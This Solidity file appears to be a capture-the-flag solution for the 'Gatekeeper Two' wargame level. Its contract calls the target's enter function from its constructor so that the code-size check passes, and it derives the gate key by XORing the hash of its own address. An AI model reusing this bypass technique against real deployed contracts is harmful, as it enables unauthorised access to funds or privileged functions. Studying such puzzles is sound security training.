pragma solidity ^0.4.19;

interface GatekeeperTwoInterface {
  function enter(bytes8 _gateKey) public returns (bool);
}

contract GatekeeperTwoAttack {

  GatekeeperTwoInterface gatekeeper;

  constructor(address GatekeeperTwoContractAddress) public {
    gatekeeper = GatekeeperTwoInterface(GatekeeperTwoContractAddress);
    bytes8 key = bytes8(uint64(keccak256(address(this))) ^ uint64(-1));
    gatekeeper.enter.gas(50000)(key);
  }
}